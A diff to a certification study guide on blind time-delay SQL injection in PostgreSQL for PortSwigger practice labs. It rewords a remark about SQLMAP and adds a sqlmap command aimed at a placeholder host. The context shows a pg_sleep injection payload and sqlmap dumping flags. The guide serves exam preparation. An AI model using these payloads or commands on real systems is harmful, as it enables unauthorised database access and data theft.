@@ -1567,7 +1567,7 @@ csrf=TOKEN&username=administrator
 
 >Blind SQL injection with time delays is tricky to ***identify***, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection ***identified***. 
 
->Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`, but `SQLMAP` no longer since March 2023 able to identify and exploit the vulnerability. Manual exploit sql injection time delay in [Practice Exam here](#practice-exam-postgresql-timedelay).  
+>Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`. I found `SQLMAP` tricky to identify and exploit the practice exam vulnerability in advance search. Manual exploit of the SQL injection time delay in [Practice Exam here](#practice-exam-postgresql-timedelay).  
 
 ```SQL
 ;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
@@ -1736,10 +1736,17 @@ sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer='
   -H 'upgrade-insecure-requests: 1' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
   -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5
-  
 ```  
 
 ![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)  
+
+>This is also a good sequence of SQLMAP commands to identify and extract data from a sensitive error based time delay SQL injection in advance search filters.  
+
+```
+sqlmap -v -u 'https://TARGET.NET/ADVsearch?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
+```  
+
+
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
 
